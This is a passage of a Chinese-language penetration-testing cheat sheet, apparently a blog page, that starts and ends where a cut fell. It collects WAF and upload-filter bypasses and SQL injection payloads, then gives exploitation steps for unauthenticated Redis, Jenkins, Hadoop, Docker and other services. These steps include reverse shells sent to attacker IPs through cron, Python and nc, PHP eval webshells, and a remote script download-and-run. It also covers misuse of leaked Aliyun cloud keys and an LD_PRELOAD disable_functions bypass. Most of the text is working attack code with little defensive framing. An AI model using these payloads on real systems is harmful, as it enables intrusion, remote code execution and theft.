<h6 id="asp-空格"><a href="#asp-空格" class="headerlink" title="asp . (空格+.)"></a>asp . (空格+.)</h6><h6 id="php-点-空格-点"><a href="#php-点-空格-点" class="headerlink" title="php. .(点+空格+点)"></a>php. .(点+空格+点)</h6><h6 id="双写phphpp"><a href="#双写phphpp" class="headerlink" title="双写phphpp"></a>双写phphpp</h6><h6 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h6><pre><code>Get参数00截断直接添加%00
POST参数00截断修改hex为00
</code></pre>
<h6 id="修改一些固定的参数"><a href="#修改一些固定的参数" class="headerlink" title="修改一些固定的参数"></a>修改一些固定的参数</h6><h6 id="文件名去掉双引号"><a href="#文件名去掉双引号" class="headerlink" title="文件名去掉双引号"></a>文件名去掉双引号</h6><h6 id="加一个filename1的参数"><a href="#加一个filename1的参数" class="headerlink" title="加一个filename1的参数"></a>加一个filename1的参数</h6><h6 id="form变量改成f-orm"><a href="#form变量改成f-orm" class="headerlink" title="form变量改成f+orm"></a>form变量改成f+orm</h6><h6 id="去掉form-data"><a href="#去掉form-data" class="headerlink" title="去掉form-data"></a>去掉form-data</h6><h6 id="在Content-Disposition或form-data-后添加多个空格"><a href="#在Content-Disposition或form-data-后添加多个空格" class="headerlink" title="在Content-Disposition或form-data;后添加多个空格"></a>在Content-Disposition或form-data;后添加多个空格</h6><h6 id="引号回车"><a href="#引号回车" class="headerlink" title="引号回车"></a>引号回车</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;backlion.asp
&quot;
</code></pre>
<h6 id="Content-Type和ConTent-Disposition调换位置"><a href="#Content-Type和ConTent-Disposition调换位置" class="headerlink" title="Content-Type和ConTent-Disposition调换位置"></a>Content-Type和ConTent-Disposition调换位置</h6><h6 id="文件名前缀加空格"><a href="#文件名前缀加空格" class="headerlink" title="文件名前缀加空格"></a>文件名前缀加空格</h6><pre><code>filename=    &quot;1.asp&quot;
</code></pre>
<h6 id="name前加空格"><a href="#name前加空格" class="headerlink" title="name前加空格"></a>name前加空格</h6><pre><code>Content-Disposition: form-data;      name=&quot;uploaded&quot;; filename=&quot;1.asp&quot;
</code></pre>
<h6 id="form-data的前后加上"><a href="#form-data的前后加上" class="headerlink" title="form-data的前后加上+"></a>form-data的前后加上+</h6><pre><code>Content-Disposition: +form-data; name=&quot;filepath&quot;; filename=&quot;1.asp&quot;
</code></pre>
<h5 id="ASP-IIS"><a href="#ASP-IIS" class="headerlink" title="ASP+IIS"></a>ASP+IIS</h5><pre><code>s%elect&gt;select
s%u0065lect&gt;select  
s%u00f0lect&gt;select
s%u0045lect = s%u0065lect = %u00f0lect
u --&gt;%u0055 --&gt; %u0075
n --&gt;%u004e --&gt; %u006e
i --&gt;%u0049 --&gt; %u0069
o --&gt;%u004f --&gt; %u006f --&gt;%u00ba
s --&gt;%u0053 --&gt; %u0073
l --&gt;%u004c --&gt; %u006c
e --&gt;%u0045 --&gt; %u0065--&gt;%u00f0
c --&gt;%u0043 --&gt; %u0063
t --&gt;%u0054 --&gt;%u0074 --&gt;%u00de --&gt;%u00fe
f --&gt;%u0046 --&gt;%u0066
r --&gt;%u0052 --&gt;%u0072
m --&gt;%u004d --&gt;%u006d
</code></pre>
<h5 id="Asp-iis-amp-aspx-iis"><a href="#Asp-iis-amp-aspx-iis" class="headerlink" title="Asp+iis&amp;aspx+iis"></a>Asp+iis&amp;aspx+iis</h5><pre><code>s%u006c%u0006ect&gt;select
</code></pre>
<h5 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h5><pre><code>TEST /sql.php?id=1 HTTP/1.1
</code></pre>
<h5 id="大小写-关键字"><a href="#大小写-关键字" class="headerlink" title="大小写/关键字"></a>大小写/关键字</h5><pre><code>UniOn SeLECT
Mid()substring()  substr()
Hex()ascii()
sleep() =benchmark()
concat_ws()=group_concat()
</code></pre>
<h5 id="双重url编码"><a href="#双重url编码" class="headerlink" title="双重url编码"></a>双重url编码</h5><h5 id="变换请求方式"><a href="#变换请求方式" class="headerlink" title="变换请求方式"></a>变换请求方式</h5><h5 id="HPP参数污染"><a href="#HPP参数污染" class="headerlink" title="HPP参数污染"></a>HPP参数污染</h5><pre><code>id=1&amp;id=2&amp;id=3
得到的结果：Asp.net + iis：id=1,2,3 
Asp+iis：id=1,2,3 
Php+apache：id=3
MSSQL:
GET+POST: 
GET:http://192.168.125.140/test/sql.aspx?id=1 union/*
post:  id=2*/select null,null,null
无逗号形式：
?id=1 union select 1&amp;id=2&amp;id=3&amp;id=4 from admin--（）  
利用逗号：
?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--
无效参数形式：
?a=/*&amp;sql=xxx&amp;b=*/  a,b为无效参数
溢出形式：?id=1/*&amp;id=*//*&amp;id=*//*......&amp;id=*//*&amp;id=*/ union  select null,system_user,null from INFORMATION_SCHEMA.schemata
MYSQL：
?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=….. &amp;id=1 union select 1,2 from admin
</code></pre>
<h5 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h5><h6 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h6><pre><code>空格符
%09、%0a、%0c、%0d、%16
</code></pre>
<h6 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>注释符
#、/*...*/、--[空格] ...
空格符
[0x09,0x0a-0x0d,0x20,0xa0]
特殊符号
%a 换行符，可结合注释符使用%23%0a，%2d%2d%0a。
%21  ！ 叹号
%2b  +  加号
%2d  -  减号
%40  @  符号
%7e   ~  波浪号
Id=1 union select(1),user()
Id=1 union /!12345select/1,user()
Id=1 union select@1,user()
Id=1 union select &#123;x 1&#125;,user()
Id=1 union select&quot;1&quot;,user()
Id=1 union select\N,user()
Id=1 union select 1,user()`
Id=1 union select 1,user()&quot;&quot;
Id=1 union select 1,user()A
Id=1 union select 1,user()`b
Id=1 union(select 1,(select/!schema_name/from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select&#123;x schema_name&#125;from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select(schema_name)from information_schema.SCHEMATA limit 1,1))
浮点数
Id= 1.0union select 1,user()
Id= 1.union select 1,user()
Id= 1E0union select 1,user()
Id=\Nunion select 1,user()
Id=1 unionselect user(),2.0from admin
Id=1 union select user(),8e0from admin
Id=1 union select user(),\Nfrom admin
内联注释
/*!UnIon12345SelEcT*/ 1,user()   //数字范围 1000-50540
mysql黑魔法
select&#123;x username&#125;from &#123;x11 test.admin&#125;;
函数
截取
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)) 
连接
concat(version(),&#39;|&#39;,user());
concat_ws(&#39;|&#39;,1,2,3)
字符转换
Ascii() Char() Hex() Unhex()
过滤逗号
127&#39; UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# 
相当于 union select 1,2,3,4,5
union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b
limit 1 offset 0相当于limit 1,0
mid(version() from 1 for 1)相当于Mid(version(),1,1)
&lt;&gt;被过滤
id=1 and ascii(substr(database(),0,1))&gt;64
比较符
greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值
id=1 and greatest(ascii(substr(database(),0,1)),64)=64
函数构造
sleep(5)/benchmark(10000000,SHA1(1))
id=1 xor sleep%23%0a(5)
id=1 xor sleep%2d%2d%0a(5)
id=1 xor sleep([%20]5) 
id=1 xor benchmark%0a(10000000,SHA1(1))
id=1 xor sleep[空白字符](5)
select&#123;x[可填充字符]1&#125;
</code></pre>
<h6 id="MSSQL-1"><a href="#MSSQL-1" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>注释符
/*、--、;00%、/**/
空格符
[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]
特殊符号
%3a 冒号
id=1 union:select 1,2 from:admin
id=1 union select+1,&#39;2&#39;,db_name() from admin
id=1 union select-1,&#39;2&#39;,db_name() from admin
id=1 union select.1,&#39;2&#39;,db_name() from admin
id=1 union select:1,&#39;2&#39;,db_name() from admin
id=1 union select~1,&#39;2&#39;,db_name() from admin
id=1%20union%20select%201,&#39;2&#39;,db_name()%80from%20admin
id=1 union select 1,&#39;2&#39;,db_name+() from admin
函数变形: db_name[空白字符]()
浮点数
id=1.1union select 1,&#39;2&#39;,db_name()
id=1e0union select 1,&#39;2&#39;,db_name()
运算符
id=1-1union select &#39;1&#39;,system_user,3 from admin
id=1e-union select &#39;1&#39;,system_user,3 from admin
字符串截取函数
Substring(@@version,1,1)
Left(@@version,1)
Right(@@version,1)
charindex(&#39;test&#39;,db_name())
字符串转换函数
Ascii(&#39;a&#39;)=char(97) 括号之间可添加空格
</code></pre>
<h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><pre><code>同时提交GET和POST
访问HTTP绕过对HTTPS的防护
%00截断
参数填充垃圾数据，缓冲区溢出
X-FORWARDED-FOR伪造绕过
静态文件/sql.php/1.js?id=1绕过
白名单绕过，URL只要存在某字符就不会拦截
/sql.php/admin.php?id=1
/sql.php?a=/manage/&amp;b=../etc/passwd
/../../../manage/../sql.asp?id=2
伪造User-agent绕过，可改为爬虫agent
</code></pre>
<h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h5 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h5><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><pre><code>&gt;redis-cli -h 127.0.0.1 flunshall 
192.168.0.110:6379&gt;ping
PONG 存在未授权访问
</code></pre>
<h6 id="JS打内网"><a href="#JS打内网" class="headerlink" title="JS打内网"></a>JS打内网</h6><pre><code>var cmd = new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      
cmd.send(&#39;flushall\r\n&#39;);             
var cmd =new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      
cmd.send(&#39;eval \&#39;&#39; + &#39;redis.call(\&quot;set\&quot;,\&quot;1\&quot;,\&quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/外网IP/5566 0&gt;&amp;1\\n\\n&quot;);redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dir\&quot;,\&quot;/var/spool/cron/\&quot;); redis.call(\&quot;config\&quot;,\&quot;set\&quot;, \&quot;dbfilename\&quot;, \&quot;root\&quot;);&#39; + &#39;\&#39; 0&#39; +&quot;\r\n&quot;);       
var cmd =new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);       
cmd.send(&#39;save\r\n&#39;);
</code></pre>
<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><pre><code>保存为sh
echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12138 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
echo -e &quot;\n\n */1 * * * * python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.108&quot;,12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
执行
&gt;bash 1.sh 192.168.0.120 6379
</code></pre>
<p><img src="34.png" alt="image"><br><img src="35.png" alt="image"></p>
<h6 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h6><pre><code>6379&gt; config set dir /var/www/html/
6379&gt; config set dbfilename shell.php
6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;
6379&gt; save
</code></pre>
<h6 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h6><pre><code>ssh-keygen
本地生成一对密钥
https://github.com/JoyChou93/hackredis
&gt;ssh-keygen -t rsa -C &quot;xx@xx.com&quot;
&gt;(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; qq.txt
&gt;redis-cli -h 127.0.0.1 flunshall
&gt;cat qq.txt | redis-cli -h 127.0.0.1 -x set crackit
&gt;redis-cli -h 127.0.0.1
6379&gt; config set dir /root/.ssh/
6379&gt; config set dbfilename &quot;authorized_keys&quot;
6379&gt; save
本地登录
#ssh -i id_rsa root@11.11.11.11
</code></pre>
<h6 id="redis-rogue-getshell"><a href="#redis-rogue-getshell" class="headerlink" title="redis-rogue-getshell"></a>redis-rogue-getshell</h6><pre><code>https://github.com/vulhub/redis-rogue-getshell
需要python3.0以上
编译
&gt;cd RedisModulesSDK/
&gt;make
会在此目录下生成exp.so
执行命令
&gt;python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c &quot;cat /etc/passwd&quot;
</code></pre>
<p><img src="36.png" alt="image"></p>
<h6 id="redis-rogue-server"><a href="#redis-rogue-server" class="headerlink" title="redis-rogue-server"></a>redis-rogue-server</h6><pre><code>https://github.com/n0b0dyCN/redis-rogue-server
需要python3.6以上
编译
&gt;cd RedisModulesSDK/exp
&gt;make
执行
&gt;./redis-rogue-server.py --rhost 192.168.0.120 --lhost 192.168.0.108
</code></pre>
<p><img src="37.png" alt="image"><br><img src="38.png" alt="image"></p>
<pre><code>也可以反向shell
</code></pre>
<p><img src="39.png" alt="image"><br><img src="40.png" alt="image"></p>
<h6 id="redis在windows下的利用"><a href="#redis在windows下的利用" class="headerlink" title="redis在windows下的利用"></a>redis在windows下的利用</h6><pre><code>Web目录写入木马
启动项
系统DLL劫持(目标重启或注销)
特定软件的DLL劫持
覆盖快捷方式
覆盖配置文件
覆盖sethc等文件
https://github.com/r35tart/RedisWriteFile
&gt;python3 rediswritefile.py --rhost=目标IP --rport=6379 --lhost=本机IP --lport=本地端口 --rpath=&quot;在目标保存的路径&quot; --rfile=&quot;在目标保存的文件&quot; --lfile=&quot;本地文件&quot; --auth=redis密码
</code></pre>
<h6 id="Lua-RCE"><a href="#Lua-RCE" class="headerlink" title="Lua RCE"></a>Lua RCE</h6><pre><code>https://github.com/QAX-A-Team/redis_lua_exploit
修改redis_lua.py里的 host 为目标 IP
执行返回正常，反弹shell
&gt;eval &quot;tonumber(&#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12345 0&gt;&amp;1&#39;, 8)&quot; 0
</code></pre>
<h5 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title="Jenkins未授权访问"></a>Jenkins未授权访问</h5><pre><code>http://www.qq.com:8080/manage
http://www.qq.com:8080/script
执行命令
&gt;println &quot;ifconfig -a&quot;.execute().text
反弹shell
&gt;println &quot;wget http://your.com/back.py -P /tmp/&quot;.execute().text
&gt;println &quot;python /tmp/back.py yourIP 8080&quot;.execute().text
写shell
&gt;println &quot;wget http://your.com/t.txt -o /var/www/html/1.php&quot;.execute().text
&gt;new File(&quot;/var/www/html/1.php&quot;).write(&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;);
&gt;def webshell = &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;
&gt;new File(&quot;/var/www/html/1.php&quot;).write(&quot;$webshell&quot;);
</code></pre>
<h5 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h5><pre><code>默认端口27017直接连接进行增删改查
连接工具
https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe
</code></pre>
<h5 id="ZooKeeper未授权访问"><a href="#ZooKeeper未授权访问" class="headerlink" title="ZooKeeper未授权访问"></a>ZooKeeper未授权访问</h5><pre><code>默认端口2181
获得服务器环境信息
&gt;echo envi|nc 192.168.0.1 2181
连接
&gt;./zkCli.sh -server ip:port
连接工具
https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip
</code></pre>
<h5 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h5><pre><code>默认端口9200
http://1.1.1.1:9200/_plugin/head/
http://1.1.1.1:9200/_nodes
http://1.1.1.1:9200/_river
http://1.1.1.1:9200/_plugin/sql/
</code></pre>
<h5 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h5><pre><code>默认端口11211
&gt;telnet 1.1.1.1 11211
&gt;nc -vv 1.1.1.1 11211
</code></pre>
<h5 id="Hadoop未授权访问"><a href="#Hadoop未授权访问" class="headerlink" title="Hadoop未授权访问"></a>Hadoop未授权访问</h5><pre><code>http://192.168.1.1:8088/cluster
本地监听端口 &gt;&gt; 创建Application &gt;&gt; 调用Submit Application API提交
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.18.129:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.18.138&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
<h5 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a>Docker未授权访问</h5><pre><code>默认端口2375
&gt;docker -H tcp://1.1.1.1:2375 images
本地监听
启动容器
docker -H tcp://1.1.1.1:2375 run -id -v /etc/crontabs:/tmp alpine:latest
docker -H tcp://1.1.1.1:2375 ps
进入容器
docker -H tcp://1.1.1.1:2375 exec -it a8ff7ed880fb sh
echo &#39;* * * * * /usr/bin/nc &#123;vps_ip&#125; 9999 -e /bin/sh&#39; &gt;&gt; /tmp/root #添加计划任务
cat /tmp/root 
exit
Shipyard默认密码
admin/shipyard
</code></pre>
<h5 id="ActiveMQ未授权访问"><a href="#ActiveMQ未授权访问" class="headerlink" title="ActiveMQ未授权访问"></a>ActiveMQ未授权访问</h5><pre><code>默认端口8161
http://1.1.1.1:8161/admin/connections.jsp
PUT /fileserver/%2F%2F2%083.jsp HTTP/1.0
Content-Length: 27
Host: 1.1.1.1:8161
Connection: Close
Authorization: Basic YWRtaW46YWRtaW4=
123123123123123123123123123
</code></pre>
<h5 id="JBOSS未授权访问"><a href="#JBOSS未授权访问" class="headerlink" title="JBOSS未授权访问"></a>JBOSS未授权访问</h5><pre><code>http://192.168.1.1:8080/jmx-console/ 无需认证进入
jboss.deployment部署shell
addURL()的paramValue写入远程war木马地址
</code></pre>
<h4 id="阿里云OSS-Key利用"><a href="#阿里云OSS-Key利用" class="headerlink" title="阿里云OSS Key利用"></a>阿里云OSS Key利用</h4><pre><code>反编译app文件，查找可能会包含oss key的文件，如JS。
OSSAccessKey、AccessKeySecret使用OSS浏览器访问。
第三方行云管家可修改系统密码。
反弹shell
From: https://xz.aliyun.com/t/8310
https://api.aliyun.com/#/?product=Ecs
搜索框搜索选择CreateCommand来创建一个命令
CommandContent填命令的base64，Type填RunShellScript
命令echo &quot;bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1&quot;| base64
bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1
YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMCZndDsmMQ==
</code></pre>
<p><img src="841.png" alt="image"></p>
<pre><code>填好以后点调试SDK
会直接给你起一个Cloud shell
</code></pre>
<p><img src="842.png" alt="image"></p>
<pre><code>并创建一个CreateCommand.py文件，使用vi编辑
</code></pre>
<p><img src="843.png" alt="image"></p>
<pre><code>填accessKeyId,accessSecret保存执行，并记录Commandid
</code></pre>
<p><img src="844.png" alt="image"></p>
<pre><code>再次在搜索框搜索InvokeCommand
</code></pre>
<p><img src="845.png" alt="image"></p>
<pre><code>Commandid填上面请求的返回值，InstanceId填行云管家显示的实例ID
</code></pre>
<p><img src="846.png" alt="image"></p>
<pre><code>填好了点调试sdk然后编辑文件把accessKeyId accessSecret填一下，执行
</code></pre>
<p><img src="847.png" alt="image"></p>
<pre><code>然后看监听的服务器shell已经反弹成功
</code></pre>
<p><img src="848.png" alt="image"></p>
<h4 id="Linux绕过disable-function"><a href="#Linux绕过disable-function" class="headerlink" title="Linux绕过disable_function"></a>Linux绕过disable_function</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><pre><code>linux环境
putenv()、mail()可用
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
http://192.168.0.107/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so
outpath是命令输出位置，sopath指定so文件路径。
或
替换php文件中的mail为error_log(&quot;a&quot;,1);
</code></pre>
<h5 id="php7-0-7-3-bypass"><a href="#php7-0-7-3-bypass" class="headerlink" title="php7.0-7.3 bypass"></a>php7.0-7.3 bypass</h5><pre><code>直接bypass
https://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php
</code></pre>
<h5 id="windows系统组件com绕过"><a href="#windows系统组件com绕过" class="headerlink" title="windows系统组件com绕过"></a>windows系统组件com绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;exec(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="CGI启动方式"><a href="#CGI启动方式" class="headerlink" title="CGI启动方式"></a>CGI启动方式</h5><pre><code>phpinfo中搜索server api是cgi或者fastcgi
如果是cgi模式:上传如下htaccess
Options ExecCGI
AddHandler cgi-script .xx
windows平台
#!C:/Windows/System32/cmd.exe /c start calc.exe
1
linux平台
#!/bin/bash
echo -ne &quot;Content-Type: text:html\n\n&quot;
whoami
如果是fast_cgi，上传如下htaccess
Options +ExecCGI
AddHandler fcgid-script .abc
FcgidWrapper &quot;C:/Windows/System32/cmd.exe /c start cmd.exe&quot; .abc
上传任意文件.abc
相对路径
AddHandler fcgid-script .html
FcgidWrapper &quot;../../php/php7.3.4nts/php-cgi.exe&quot; .html

AddHandler fcgid-script .xx
FcgidWrapper &quot;../../../WWW/localhost/calc.exe&quot; .xx
</code></pre>
<h5 id="ImageMagick组件绕过"><a href="#ImageMagick组件绕过" class="headerlink" title="ImageMagick组件绕过"></a>ImageMagick组件绕过</h5><pre><code>imageMagick 版本 v6.9.3-9 或 v7.0.1-0
第一种
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exploit</span> = &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox <span class="number">0</span> <span class="number">0</span> <span class="number">640</span> <span class="number">480</span></span><br><span class="line">fill <span class="string">&#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span>    <span class="comment">//核心</span></span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line">file_put_contents(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);</span><br><span class="line"><span class="variable">$thumb</span> = <span class="keyword">new</span> Imagick();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;readImage(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;writeImage(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;clear();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;destroy();</span><br><span class="line">unlink(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<pre><code>第二种
</code></pre>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* cmd = <span class="string">&quot;nc -e /usr/bin/zsh 127.0.0.1 4444&quot;</span>;</span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fileno</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>编译
gcc -shared -fPIC imag.c -o imag.so
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&#x27;LD_PRELOAD=/var/www/html/imag.so&#x27;</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="keyword">new</span> Imagick(<span class="string">&#x27;/tmp/1.ps&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="常规函数绕过"><a href="#常规函数绕过" class="headerlink" title="常规函数绕过"></a>常规函数绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">passthru(<span class="string">&quot;whoami&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_POST</span>[<span 